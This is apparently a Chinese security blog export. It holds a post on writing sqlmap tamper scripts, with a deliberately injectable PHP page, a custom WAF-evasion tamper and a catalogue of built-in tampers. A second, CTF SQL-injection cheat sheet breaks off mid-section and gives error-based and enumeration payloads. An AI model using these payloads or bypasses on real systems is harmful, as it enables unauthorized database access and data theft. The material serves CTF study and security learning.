<p><strong>tamper</strong> ，这个是脚本最重要的函数，你的所有绕过替换都是在这里编写的。它有一个payload参数，这个参数就是你的sqlmap进行自动注入时的sql语句，你需要的就是替换这个payload，来完成自己想要的绕过。后面还有 <strong>kwargs</strong> 这个是修改http头里的内容函数，举个例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sqlmap/tamper/vanrish.py</span></span><br><span class="line"><span class="comment"># 修改X-originating-IP</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    headers = kwargs.get(<span class="string">&quot;headers&quot;</span>, &#123;&#125;)</span><br><span class="line">    headers[<span class="string">&quot;X-originating-IP&quot;</span>] = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
<h2 id="sqlmap的tamper编写"><a href="#sqlmap的tamper编写" class="headerlink" title="sqlmap的tamper编写"></a>sqlmap的tamper编写</h2><p>我这里简单搭建了一个php：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$connection</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>];</span><br><span class="line"><span class="variable">$query</span>=<span class="string">&quot;select name from tamper where id=&quot;</span>.<span class="variable">$id</span>.<span class="string">&quot;;&quot;</span>;</span><br><span class="line"><span class="comment">//echo $query;</span></span><br><span class="line"><span class="comment">//定义一个黑名单</span></span><br><span class="line"><span class="variable">$black_list</span>=<span class="keyword">array</span>(<span class="string">&quot;select&quot;</span>,<span class="string">&quot;and&quot;</span>,<span class="string">&quot; &quot;</span>,<span class="string">&quot;/*&quot;</span>,<span class="string">&quot;*/&quot;</span>);</span><br><span class="line"><span class="comment">//计算数组长度</span></span><br><span class="line"><span class="variable">$num</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$black_list</span>);</span><br><span class="line"><span class="comment">//循环校验是否有黑名单内的字符串</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="variable">$num</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$id</span>,<span class="variable">$black_list</span>[<span class="variable">$i</span>]))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;hack,get out&quot;</span>); <span class="comment">//黑名单里面的单词、字符不允许出现。</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		pass;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$result</span>=<span class="variable">$connection</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$query</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$result</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123; <span class="comment">//判断结果集中行的数目是否大于0</span></span><br><span class="line">        <span class="keyword">while</span>(<span class="variable">$row</span> =<span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_array</span>() )&#123; <span class="comment">//循环输出结果集中的记录</span></span><br><span class="line">            <span class="keyword">echo</span> (<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;查询失败&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$result</span>-&gt;<span class="title function_ invoke__">free</span>();</span><br><span class="line"><span class="variable">$connection</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面的代码可以看到过滤了select、and、空格、&#x2F;* 和 *&#x2F;。直接用sqlmap是无法跑出来的，所以我们需要编写tamper，直接贴上我编写的tamper，因为太简单了：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">auth: geez  </span></span><br><span class="line"><span class="string">blog: geeeez.github.io</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.common <span class="keyword">import</span> singleTimeWarnMessage</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">     <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        payload = payload.replace(<span class="string">&quot;select&quot;</span>,<span class="string">&quot;SELECT&quot;</span>)</span><br><span class="line">        payload = payload.replace(<span class="string">&quot;and&quot;</span>,<span class="string">&quot;AND&quot;</span>)</span><br><span class="line">        payload = payload.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;%09&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> payload</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img data-src="/images/1569575157332.png" alt="1569575157332"></p>
<p>为什么空格要过滤成%09呢？因为+和%20到后台都是空格，会被过滤%09不会（因为他不是空格），但是它可以当空格用。</p>
<p>以上就是tamper的编写，非常简单，但是如果想写好tamper还是需要很深的python功底，你可以不用replace进行替换，可以在tamper函数中进行正则的匹配，URL编码、动态替换等等方式，具体能利用成什么样子，看你的技巧了，记住tamper函数只需要最后返回一个payload，你的payload怎么得来的他不管，你用python任何的语法它都可以支持，最终它只要你的payload，说这么多是提醒大家别被示例限制了想象力。</p>
<h2 id="sqlmap自带tamper"><a href="#sqlmap自带tamper" class="headerlink" title="sqlmap自带tamper"></a>sqlmap自带tamper</h2><p>sqlmap自带的tamper有时候也比较好用，所以下面就罗列了出来。</p>
<p>适用数据库：ALL<br>作用：将引号替换为utf-8，用于过滤单引号<br>使用脚本前：tamper(“1 AND ‘1’&#x3D;’1”)<br>使用脚本后：1 AND %EF%BC%871%EF%BC%87&#x3D;%EF%BC%871</p>
<p>base64encode.py<br>适用数据库：ALL<br>作用：替换为base64编码<br>使用脚本前：tamper(“1’ AND SLEEP(5)#”)<br>使用脚本后：MScgQU5EIFNMRUVQKDUpIw&#x3D;&#x3D;</p>
<p>multiplespaces.py<br>适用数据库：ALL<br>作用：围绕sql关键字添加多个空格<br>使用脚本前：tamper(‘1 UNION SELECT foobar’)<br>使用脚本后：1 UNION SELECT foobar</p>
<p>space2plus.py<br>适用数据库：ALL<br>作用：用加号替换空格<br>使用脚本前：tamper(‘SELECT id FROM users’)<br>使用脚本后：SELECT+id+FROM+users</p>
<p>nonrecursivereplacement.py<br>适用数据库：ALL<br>作用：作为双重查询语句，用双重语句替代预定义的sql关键字（适用于非常弱的自定义过滤器，例如将select替换为空）<br>使用脚本前：tamper(‘1 UNION SELECT 2–’)<br>使用脚本后：1 UNIOUNIONN SELESELECTCT 2–</p>
<p>space2randomblank.py<br>适用数据库：ALL<br>作用：将空格替换为其他有效字符<br>使用脚本前：tamper(‘SELECT id FROM users’)<br>使用脚本后：SELECT%0Did%0DFROM%0Ausers</p>
<p>unionalltounion.py<br>适用数据库：ALL<br>作用：将union allselect 替换为unionselect<br>使用脚本前：tamper(‘-1 UNION ALL SELECT’)<br>使用脚本后：-1 UNION SELECT</p>
<p>securesphere.py<br>适用数据库：ALL<br>作用：追加特定的字符串<br>使用脚本前：tamper(‘1 AND 1&#x3D;1’)<br>使用脚本后：1 AND 1&#x3D;1 and ‘0having’&#x3D;’0having’</p>
<p>space2dash.py<br>适用数据库：ALL<br>作用：将空格替换为–，并添加一个随机字符串和换行符<br>使用脚本前：tamper(‘1 AND 9227&#x3D;9227’)<br>使用脚本后：1–nVNaVoPYeva%0AAND–ngNvzqu%0A9227&#x3D;9227</p>
<p>space2mssqlblank.py<br>适用数据库：Microsoft SQL Server<br>测试通过数据库：Microsoft SQL Server 2000、Microsoft SQL Server 2005<br>作用：将空格随机替换为其他空格符号(‘%01’, ‘%02’, ‘%03’, ‘%04’, ‘%05’, ‘%06’, ‘%07’, ‘%08’, ‘%09’, ‘%0B’, ‘%0C’, ‘%0D’, ‘%0E’, ‘%0F’, ‘%0A’)<br>使用脚本前：tamper(‘SELECT id FROM users’)<br>使用脚本后：SELECT%0Eid%0DFROM%07users</p>
<p>between.py<br>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>作用：用NOT BETWEEN 0 AND #替换&gt;<br>使用脚本前：tamper(‘1 AND A &gt; B–’)<br>使用脚本后：1 AND A NOT BETWEEN 0 AND B–</p>
<p>percentage.py<br>适用数据库：ASP<br>测试通过数据库：Microsoft SQL Server 2000, 2005、MySQL 5.1.56, 5.5.11、PostgreSQL 9.0<br>作用：在每个字符前添加一个%<br>使用脚本前：tamper(‘SELECT FIELD FROM TABLE’)<br>使用脚本后：%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</p>
<p>sp_password.py<br>适用数据库：MSSQL<br>作用：从T-SQL日志的自动迷糊处理的有效载荷中追加sp_password<br>使用脚本前：tamper(‘1 AND 9227&#x3D;9227– ‘)<br>使用脚本后：1 AND 9227&#x3D;9227– sp_password</p>
<p>charencode.py<br>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>作用：对给定的payload全部字符使用url编码（不处理已经编码的字符）<br>使用脚本前：tamper(‘SELECT FIELD FROM%20TABLE’)<br>使用脚本后：%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45</p>
<p>randomcase.py<br>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>作用：随机大小写<br>使用脚本前：tamper(‘INSERT’)<br>使用脚本后：INseRt</p>
<p>charunicodeencode.py<br>适用数据库：ASP、ASP.NET<br>测试通过数据库：Microsoft SQL Server 2000&#x2F;2005、MySQL 5.1.56、PostgreSQL 9.0.3<br>作用：适用字符串的unicode编码<br>使用脚本前：tamper(‘SELECT FIELD%20FROM TABLE’)<br>使用脚本后：%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045</p>
<p>space2comment.py<br>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>作用：将空格替换为&#x2F;<strong>&#x2F;<br>使用脚本前：tamper(‘SELECT id FROM users’)<br>使用脚本后：SELECT&#x2F;</strong>&#x2F;id&#x2F;<strong>&#x2F;FROM&#x2F;</strong>&#x2F;users</p>
<p>equaltolike.py<br>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5<br>作用：将&#x3D;替换为LIKE<br>使用脚本前：tamper(‘SELECT * FROM users WHERE id&#x3D;1’)<br>使用脚本后：SELECT * FROM users WHERE id LIKE 1</p>
<p>equaltolike.py<br>测试通过数据库：MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>作用：将&gt;替换为GREATEST，绕过对&gt;的过滤<br>使用脚本前：tamper(‘1 AND A &gt; B’)<br>使用脚本后：1 AND GREATEST(A,B+1)&#x3D;A</p>
<p>ifnull2ifisnull.py<br>适用数据库：MySQL、SQLite (possibly)、SAP MaxDB (possibly)<br>测试通过数据库：MySQL 5.0 and 5.5<br>作用：将类似于IFNULL(A, B)替换为IF(ISNULL(A), B, A)，绕过对IFNULL的过滤<br>使用脚本前：tamper(‘IFNULL(1, 2)’)<br>使用脚本后：IF(ISNULL(1),2,1)</p>
<p>modsecurityversioned.py<br>适用数据库：MySQL<br>测试通过数据库：MySQL 5.0<br>作用：过滤空格，使用mysql内联注释的方式进行注入<br>使用脚本前：tamper(‘1 AND 2&gt;1–’)<br>使用脚本后：1 &#x2F;<em>!30874AND 2&gt;1</em>&#x2F;–</p>
<p>space2mysqlblank.py<br>适用数据库：MySQL<br>测试通过数据库：MySQL 5.1<br>作用：将空格替换为其他空格符号(‘%09’, ‘%0A’, ‘%0C’, ‘%0D’, ‘%0B’)<br>使用脚本前：tamper(‘SELECT id FROM users’)<br>使用脚本后：SELECT%0Bid%0DFROM%0Cusers</p>
<p>modsecurityzeroversioned.py<br>适用数据库：MySQL<br>测试通过数据库：MySQL 5.0<br>作用：使用内联注释方式（&#x2F;<em>!00000</em>&#x2F;）进行注入<br>使用脚本前：tamper(‘1 AND 2&gt;1–’)<br>使用脚本后：1 &#x2F;<em>!00000AND 2&gt;1</em>&#x2F;–</p>
<p>space2mysqldash.py<br>适用数据库：MySQL、MSSQL<br>作用：将空格替换为 – ，并追随一个换行符<br>使用脚本前：tamper(‘1 AND 9227&#x3D;9227’)<br>使用脚本后：1–%0AAND–%0A9227&#x3D;9227</p>
<p>bluecoat.py<br>适用数据库：Blue Coat SGOS<br>测试通过数据库：MySQL 5.1,、SGOS<br>作用：在sql语句之后用有效的随机空白字符替换空格符，随后用LIKE替换&#x3D;<br>使用脚本前：tamper(‘SELECT id FROM users where id &#x3D; 1’)<br>使用脚本后：SELECT%09id FROM users where id LIKE 1</p>
<p>versionedkeywords.py<br>适用数据库：MySQL<br>测试通过数据库：MySQL 4.0.18, 5.1.56, 5.5.11<br>作用：注释绕过<br>使用脚本前：tamper(‘1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#’)<br>使用脚本后：1&#x2F;<em>!UNION</em>&#x2F;&#x2F;<em>!ALL</em>&#x2F;&#x2F;<em>!SELECT</em>&#x2F;&#x2F;<em>!NULL</em>&#x2F;,&#x2F;<em>!NULL</em>&#x2F;, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()&#x2F;<em>!AS</em>&#x2F;&#x2F;<em>!CHAR</em>&#x2F;),CHAR(32)),CHAR(58,100,114,117,58))#</p>
<p>halfversionedmorekeywords.py<br>适用数据库：MySQL &lt; 5.1<br>测试通过数据库：MySQL 4.0.18&#x2F;5.0.22<br>作用：在每个关键字前添加mysql版本注释<br>使用脚本前：tamper(“value’ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’&#x3D;’QDWa”)<br>使用脚本后：value’&#x2F;<em>!0UNION&#x2F;</em>!0ALL&#x2F;<em>!0SELECT&#x2F;</em>!0CONCAT(&#x2F;<em>!0CHAR(58,107,112,113,58),&#x2F;</em>!0IFNULL(CAST(&#x2F;<em>!0CURRENT_USER()&#x2F;</em>!0AS&#x2F;<em>!0CHAR),&#x2F;</em>!0CHAR(32)),&#x2F;<em>!0CHAR(58,97,110,121,58)),&#x2F;</em>!0NULL,&#x2F;<em>!0NULL#&#x2F;</em>!0AND ‘QDWa’&#x3D;’QDWa</p>
<p>space2morehash.py<br>适用数据库：MySQL &gt;&#x3D; 5.1.13<br>测试通过数据库：MySQL 5.1.41<br>作用：将空格替换为#，并添加一个随机字符串和换行符<br>使用脚本前：tamper(‘1 AND 9227&#x3D;9227’)<br>使用脚本后：1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227&#x3D;9227</p>
<p>apostrophenullencode.py<br>适用数据库：ALL<br>作用：用非法双字节Unicode字符替换单引号<br>使用脚本前：tamper(“1 AND ‘1’&#x3D;’1”)<br>使用脚本后：1 AND %00%271%00%27&#x3D;%00%271</p>
<p>appendnullbyte.py<br>适用数据库：ALL<br>作用：在有效载荷的结束位置加载null字节字符编码<br>使用脚本前：tamper(‘1 AND 1&#x3D;1’)<br>使用脚本后：1 AND 1&#x3D;1%00</p>
<p>chardoubleencode.py<br>适用数据库：ALL<br>作用：对给定的payload全部字符使用双重url编码（不处理已经编码的字符）<br>使用脚本前：tamper(‘SELECT FIELD FROM%20TABLE’)<br>使用脚本后：%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545</p>
<p>unmagicquotes.py<br>适用数据库：ALL<br>作用：用一个多字节组合%bf%27和末尾通用注释一起替换空格<br>使用脚本前：tamper(“1’ AND 1&#x3D;1”)<br>使用脚本后：1%bf%27 AND 1&#x3D;1–</p>
<p>randomcomments.py<br>适用数据库：ALL<br>作用：用注释符分割sql关键字<br>使用脚本前：tamper(‘INSERT’)<br>使用脚本后：I&#x2F;<strong>&#x2F;N&#x2F;</strong>&#x2F;SERT</p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF中的sql注入总结</title>
    <url>//posts/CTF%E4%B8%AD%E7%9A%84sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>非常不想写这篇博客，因为ctf中的sql注入技巧太乱了，不知道怎么排版怎么分块把他表述清楚，然后又能像一个笔记一样时时供我查阅。所以直到我打现在这几个字的时候我都在想咋把我那嘈杂的笔记整理出这篇文章。但是整理肯定还是要整理的，毕竟自己也要看。<span id="more"></span></p>
<h4 id="CTF-sql注入三原则"><a href="#CTF-sql注入三原则" class="headerlink" title="CTF sql注入三原则"></a>CTF sql注入三原则</h4><p>1.细致的猜测注入点的语句大概是什么样子。<br>2.判断是有回显的注入还是盲注，有回显的注入当盲注做是自己为难自己。<br>3.盲注优先考虑布尔盲注，然后才是时间盲注。</p>
<h4 id="sql注入流程"><a href="#sql注入流程" class="headerlink" title="sql注入流程"></a>sql注入流程</h4><p>我们来捋一捋这个sql注入的一般流程，首先有一个注入点，然后肯定有一个waf，waf过滤了一些关键字，我们做的就是绕过关键字的过滤，构造能执行的sql语句去获取数据库的flag。捋完流程，我们就知道流程中每一步应该怎么做、应该做什么。在开始之前还是要提出几个注意点：<br>1.注意区分数据的大小写，因为mysql默认不区分数据的大小写比较<br>解决方法：ascii编码比较、WHERE后加BINARY、regexp<br>2.站在出题者角度思考问题。</p>
<h4 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h4><h5 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h5><p>自动化fuzz或者手工fuzz，如果不ban ip 、网络稳定，那么自动化fuzz还是很好用的。因为绝大多数都是关键字过滤，fuzz的准确度很高。脚本就是直接py请求查看响应是否有waf响应的关键字。<br>fuzz字典（不全，自行补充）</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">or</span><br><span class="line">|</span><br><span class="line">%</span><br><span class="line">and</span><br><span class="line">%26</span><br><span class="line">&amp;</span><br><span class="line">union</span><br><span class="line">select</span><br><span class="line">information</span><br><span class="line">information_schema</span><br><span class="line">name</span><br><span class="line">table_name</span><br><span class="line">column_name</span><br><span class="line">if</span><br><span class="line">,</span><br><span class="line">%20</span><br><span class="line"> //空格</span><br><span class="line">sleep</span><br><span class="line">^</span><br><span class="line">in</span><br><span class="line">like</span><br><span class="line">between</span><br><span class="line">*</span><br><span class="line">#</span><br><span class="line">--</span><br><span class="line">--+</span><br><span class="line">-</span><br><span class="line">.</span><br><span class="line">_</span><br><span class="line">(</span><br><span class="line">)</span><br><span class="line">&#x27;</span><br><span class="line">&quot;</span><br><span class="line">@</span><br><span class="line">user</span><br><span class="line">password</span><br><span class="line">passwd</span><br><span class="line">username</span><br></pre></td></tr></table></figure>

<h5 id="绕过waf"><a href="#绕过waf" class="headerlink" title="绕过waf"></a>绕过waf</h5><p>绕过waf说白了就是同功能函数的替换，比如 substr &#x3D;&#x3D; mid，下面我们就搞个这样的表方便大家查询(他们在一定成都上都有替代作用)。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//比较判断</span><br><span class="line">&gt;  &lt;  &lt;&gt;  = and or || &amp;&amp; %26%26 like  between  regexp  in  strcmp  locate(s1,s)  position(s1 in s)  instr(s,s1)  greatest()  find_in_set() </span><br><span class="line">//ps：select &quot;123&quot; in (&quot;123&quot;); =&gt; 1 select &quot;123&quot; in (&quot;12&quot;)</span><br><span class="line"></span><br><span class="line">//ascii</span><br><span class="line">hex()</span><br><span class="line">bin()</span><br><span class="line">ord()</span><br><span class="line"></span><br><span class="line">//切割字符串</span><br><span class="line">left()</span><br><span class="line">right()</span><br><span class="line">mid()</span><br><span class="line">substr()</span><br><span class="line">substring()</span><br><span class="line">lpad()</span><br><span class="line">rpad()</span><br><span class="line">//ps:LPAD(&#x27;abcdef&#x27;,4,&#x27;?&#x27;); 和RPAD(&#x27;abcdef&#x27;,4,&#x27;?&#x27;);结果都为abcd</span><br><span class="line"></span><br><span class="line">//空格</span><br><span class="line">%20 + /**/ /*乱字符*/ </span><br><span class="line">1e1 1.1 () </span><br><span class="line">//这里的括号绕过是有限制的不是直接括号当空格用，还是举个例子把：</span><br><span class="line">select(id)from(user);  括号内不能是*。</span><br><span class="line">PS:浮点数科学计数法后面的字符串也不需要空格 比如：select 1.1and(1)</span><br><span class="line"></span><br><span class="line">//过滤逗号</span><br><span class="line">imit 0,1 =&gt; limit 1 offset 0;</span><br><span class="line">mid(str,5,1) =&gt;mid(&#x27;str&#x27;from 5 for 1) =&gt;substr(&#x27;str&#x27; from for 1)</span><br><span class="line">union select 1,2,3 =&gt; union select * from (select 1)a join (select 2)b join (select 3)c;</span><br><span class="line">mid(&#x27;123&#x27; from -1); =&gt;3 //适用于for被过滤</span><br><span class="line">mid(&#x27;123&#x27; from -2); =&gt;23 //适用于for被过滤</span><br><span class="line">substring(&#x27;abc&#x27; from 1) = abc  </span><br><span class="line">substring(&#x27;abc&#x27; from 2) = bc</span><br><span class="line">这样我们通过ord ascii 函数即可进行判断，因为这两个函数返回第一个字符的ascii码</span><br><span class="line"></span><br><span class="line">//连接字符串的函数</span><br><span class="line">concat(str1,str2) 将字符串首尾相连</span><br><span class="line">concat_ws(separator,str1,str2) 将字符串用指定连接符连接</span><br><span class="line">group_concat()</span><br><span class="line"></span><br><span class="line">//注释</span><br><span class="line">#</span><br><span class="line">/**/</span><br><span class="line">--</span><br><span class="line">;%00 //mysql是C写的也存在00截断</span><br><span class="line"></span><br><span class="line">//延时函数</span><br><span class="line">sleep()</span><br><span class="line">benchmark(1000000,sha(1))</span><br><span class="line"></span><br><span class="line">//hex编码的用处</span><br><span class="line">所有用户输入的会拼接到=号后面的数据都可用hex编码比如：</span><br><span class="line">select * from user where username=0x7cb6e453</span><br><span class="line">这样的好处就是，比如不需要单引号 绕过关键字过滤等。</span><br><span class="line"></span><br><span class="line">//绕过一体化过滤 比如 过滤user()</span><br><span class="line">select user/**/()  //这样一样能执行，不过这样过滤的waf倒是很少见。</span><br><span class="line"></span><br><span class="line">//报错注入</span><br><span class="line">1.floor()</span><br><span class="line">and (select 1 from(select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br><span class="line"></span><br><span class="line">2.updatexml() //5.1.5</span><br><span class="line">and 1=(updatexml(1,concat(0x3a,(select user())),1))</span><br><span class="line"></span><br><span class="line">3.extractvalue() //5.1.5</span><br><span class="line">and extractvalue(1,concat(0x5c,(select user())))</span><br><span class="line"></span><br><span class="line">4.exp() //5.5.5版本之后可以使用</span><br><span class="line">select host from user where user = &#x27;root&#x27; and Exp(~(select * from (select version())a));</span><br><span class="line"></span><br><span class="line">5.name_const //支持老版本</span><br><span class="line">select * from (select NAME_CONST(version(),0),NAME_CONST(version(),0))x;</span><br><span class="line"></span><br><span class="line">6.geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring() 几何函数报错</span><br><span class="line">select multipoint((select * from (select * from (select * from (select version())a)b)c));</span><br><span class="line">7.有时候报错注入是可以根据列名把表名爆出来 # 比如 1&#x27;||polygon(passwd)</span><br><span class="line"></span><br><span class="line">//宽字节注入就不说了，别人写太多了</span><br><span class="line">%df 逃离单引号的转义</span><br><span class="line"></span><br><span class="line">//or被过滤 或者 是 information不能使用的情况下</span><br><span class="line">一般考点可能是同表查询直接切割，比如 select * from flag where id=1 and mid(flag,1,1)=&#x27;f&#x27;</span><br><span class="line">还有可能考察5.6.x以上版本的新特性 -&gt; 在其自带的 mysql 库中，新增了 innodb_table_stats 和 innodb_index_stats 这两张日志表。如果数据表的引擎是innodb ，则会在这两张表中记录表、键的信息</span><br><span class="line">其中 innodb_table_stats innodb_index_stats 等同于 information_schema.tables  当然要想深入理解还是下载一个5.6的数据库仔细看看</span><br><span class="line"></span><br><span class="line">//limit where 被过滤 </span><br><span class="line">可以利用group by having 来做限制条件！</span><br><span class="line">select uid,uname,passwd from admin group by passwd having uid=1;这样就能得到一行数据 并且有where作用，当然没有where和limit那么方便，更多操作还有待开放呢！</span><br><span class="line"></span><br><span class="line">//番外篇之我的经验</span><br><span class="line">越来越多的用 xor ^ regexp 这些作比较</span><br><span class="line">常用payload if(mid(sql)=&#x27;a&#x27;，1，0)</span><br><span class="line">善用 length() 这样就知道查询的未知字段是多少长度，写脚本也方便，也能直接猜测长度对应的字符可能是啥。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>通过上面的这些替换绕过waf,最终我们需要执行我们构造出来的语句来获取flag，一般是通过information_schema表，这个表相当于一个字典，保存了所有database的信息。</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">database() //获取当前数据库</span><br><span class="line">//查库</span><br><span class="line">select schema_name from information_Schema.schemata limit 1,1; </span><br><span class="line">//查表</span><br><span class="line">select table_name from information_Schema.tables where table_schema=database() limit 1,1</span><br><span class="line">查字段</span><br><span class="line">select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;user&#x27; limit 0,1</span><br><span class="line">//</span><br></pre></td></tr></table></figure>

<h4 id="还有一些小众的技巧"><a href="#还有一些小众的技巧" class="headerlink" title="还有一些小众的技巧"></a>还有一些小众的技巧</h4><h5 id="无法获取列名如何取数据"><a href="#无法获取列名如何取数据" class="headerlink" title="无法获取列名如何取数据"></a>无法获取列名如何取数据</h5><p>1.有回显的order by进行数据猜测</p>
<table>
<thead>
<tr>
<th align="center">id</th>
<th align="center">username</th>
<th align="center">xxxxxx</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="center">admin</td>
<td align="center">flag{this_is_flag}</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">admin2</td>
<td align="center">1</td>
</tr>
</tbody></table>
<p>如上一个数据表flag，当我们通过information表获取到了表明和有多少列，但是死活不知道最后一列列名，那么怎么查？</p>
<p>如果是有回显的注入可以这样</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flag <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">&#x27;fl&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span>;</span><br></pre></td></tr></table></figure>
<p>通过我们的联合查询的第三列来一步一步的比对出flag是什么字符串。举个例子：<br>比如我们的显示位是3那么：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flag <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">&#x27;fl&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span>;</span><br></pre></td></tr></table></figure>
<p>这样如果我们的fl显示出来那么说明，它下面的字段应该是fl+字符，注意这里必须一位一位的去尝试。当然这个方法局限性很大，还很麻烦。</p>
<p>2.大多的时候是盲注，那就可以使用三表联合查询法：<br>网上的三表联合查询法总是讲不清楚，下面我们来分解下，你不用搞清楚什么是三表联合查询，你只需搞清楚每一步是什么意思即可。<br>首先我们构造一列：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">1</span>)c1)t1  </span><br></pre></td></tr></table></figure>
<p>上面的语句图形化查询结果如表</p>
<table>
<thead>
<tr>
<th align="center">c1</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
</tr>
</tbody></table>
<p>我们需要上面这样的列三个，因为目标表的列是三个（如果目标表查询的是五列，我们就需要构造五列）<br>然后我们把列组合在一起</p>
